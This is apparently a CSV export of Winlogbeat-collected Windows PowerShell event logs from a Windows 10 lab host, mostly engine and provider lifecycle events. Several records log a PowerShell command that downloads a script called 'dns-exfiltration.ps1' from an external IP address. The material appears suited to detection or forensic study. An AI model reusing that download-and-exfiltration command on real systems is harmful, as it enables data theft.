"Oct 23, 2022 @ 17:00:07.313",oXkSBIQByII7dpeEIBsq,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",400,"Oct 23, 2022 @ 17:00:08.061","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=213aa68b-1f94-4dac-a846-12cb94b849b1
	HostApplication=powershell
	EngineVersion=5.1.19041.1682
	RunspaceId=d2fc84ac-155b-400f-9c45-5efbc68ced20
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Available,"-","-","-","-",None,"-","-","-","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=213aa68b-1f94-4dac-a846-12cb94b849b1
	HostApplication=powershell
	EngineVersion=5.1.19041.1682
	RunspaceId=d2fc84ac-155b-400f-9c45-5efbc68ced20
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",400,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4593,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:00:07.229",m3kSBIQByII7dpeEIBsq,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:00:08.061","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=213aa68b-1f94-4dac-a846-12cb94b849b1
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Registry,"-","-","-","-",Started,"-","-","-","	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=213aa68b-1f94-4dac-a846-12cb94b849b1
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4587,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:00:07.229",nHkSBIQByII7dpeEIBsq,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:00:08.061","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=213aa68b-1f94-4dac-a846-12cb94b849b1
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Alias,"-","-","-","-",Started,"-","-","-","	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=213aa68b-1f94-4dac-a846-12cb94b849b1
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4588,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:00:07.229",nXkSBIQByII7dpeEIBsq,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:00:08.061","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=213aa68b-1f94-4dac-a846-12cb94b849b1
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Environment,"-","-","-","-",Started,"-","-","-","	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=213aa68b-1f94-4dac-a846-12cb94b849b1
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4589,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:00:07.229",nnkSBIQByII7dpeEIBsq,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:00:08.061","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=213aa68b-1f94-4dac-a846-12cb94b849b1
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",FileSystem,"-","-","-","-",Started,"-","-","-","	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=213aa68b-1f94-4dac-a846-12cb94b849b1
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4590,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:00:07.229",n3kSBIQByII7dpeEIBsq,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:00:08.061","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=213aa68b-1f94-4dac-a846-12cb94b849b1
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Function,"-","-","-","-",Started,"-","-","-","	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=213aa68b-1f94-4dac-a846-12cb94b849b1
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4591,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:00:07.229",oHkSBIQByII7dpeEIBsq,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:00:08.061","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=213aa68b-1f94-4dac-a846-12cb94b849b1
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Variable,"-","-","-","-",Started,"-","-","-","	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=213aa68b-1f94-4dac-a846-12cb94b849b1
	HostApplication=powershell
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4592,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:00:00.413",a3kSBIQByII7dpeEBBtn,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",403,"Oct 23, 2022 @ 17:00:00.950","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b206e7a8-f785-4350-92ac-8c6a21d0cb23
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://20.248.172.247/dns-exfiltration.ps1' -OutFile 'dns-exfiltration.ps1'
	EngineVersion=5.1.19041.1682
	RunspaceId=963ec518-fc85-4c4d-ba8d-8adb77207e53
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Stopped,"-","-","-","-",Available,"-","-","-","	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b206e7a8-f785-4350-92ac-8c6a21d0cb23
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://20.248.172.247/dns-exfiltration.ps1' -OutFile 'dns-exfiltration.ps1'
	EngineVersion=5.1.19041.1682
	RunspaceId=963ec518-fc85-4c4d-ba8d-8adb77207e53
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",403,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4586,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:59:59.375",ankSBIQByII7dpeEABtq,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",400,"Oct 23, 2022 @ 16:59:59.924","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b206e7a8-f785-4350-92ac-8c6a21d0cb23
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://20.248.172.247/dns-exfiltration.ps1' -OutFile 'dns-exfiltration.ps1'
	EngineVersion=5.1.19041.1682
	RunspaceId=963ec518-fc85-4c4d-ba8d-8adb77207e53
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Available,"-","-","-","-",None,"-","-","-","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b206e7a8-f785-4350-92ac-8c6a21d0cb23
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://20.248.172.247/dns-exfiltration.ps1' -OutFile 'dns-exfiltration.ps1'
	EngineVersion=5.1.19041.1682
	RunspaceId=963ec518-fc85-4c4d-ba8d-8adb77207e53
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",400,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4585,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:59:59.312",ZHkSBIQByII7dpeEABtq,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:59:59.924","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b206e7a8-f785-4350-92ac-8c6a21d0cb23
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://20.248.172.247/dns-exfiltration.ps1' -OutFile 'dns-exfiltration.ps1'
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Registry,"-","-","-","-",Started,"-","-","-","	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b206e7a8-f785-4350-92ac-8c6a21d0cb23
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://20.248.172.247/dns-exfiltration.ps1' -OutFile 'dns-exfiltration.ps1'
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4579,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:59:59.312",ZXkSBIQByII7dpeEABtq,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:59:59.924","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b206e7a8-f785-4350-92ac-8c6a21d0cb23
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://20.248.172.247/dns-exfiltration.ps1' -OutFile 'dns-exfiltration.ps1'
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Alias,"-","-","-","-",Started,"-","-","-","	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b206e7a8-f785-4350-92ac-8c6a21d0cb23
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://20.248.172.247/dns-exfiltration.ps1' -OutFile 'dns-exfiltration.ps1'
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4580,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:59:59.312",ZnkSBIQByII7dpeEABtq,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:59:59.924","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b206e7a8-f785-4350-92ac-8c6a21d0cb23
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://20.248.172.247/dns-exfiltration.ps1' -OutFile 'dns-exfiltration.ps1'
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Environment,"-","-","-","-",Started,"-","-","-","	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b206e7a8-f785-4350-92ac-8c6a21d0cb23
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://20.248.172.247/dns-exfiltration.ps1' -OutFile 'dns-exfiltration.ps1'
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4581,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:59:59.312",Z3kSBIQByII7dpeEABtq,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:59:59.924","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b206e7a8-f785-4350-92ac-8c6a21d0cb23
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://20.248.172.247/dns-exfiltration.ps1' -OutFile 'dns-exfiltration.ps1'
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",FileSystem,"-","-","-","-",Started,"-","-","-","	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b206e7a8-f785-4350-92ac-8c6a21d0cb23
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://20.248.172.247/dns-exfiltration.ps1' -OutFile 'dns-exfiltration.ps1'
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4582,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:59:59.312",aHkSBIQByII7dpeEABtq,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 16:59:59.924","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b206e7a8-f785-4350-92ac-8c6a21d0cb23
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://20.248.172.247/dns-exfiltration.ps1' -OutFile 'dns-exfiltration.ps1'
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Function,"-","-","-","-",Started,"-","-","-","	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=b206e7a8-f785-4350-92ac-8c6a21d0cb23
	HostApplication=powershell -c Invoke-WebRequest -Uri 'http://20.248.172.247/dns-exfiltration.ps1' -OutFile 'dns-exfiltration.ps1'
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
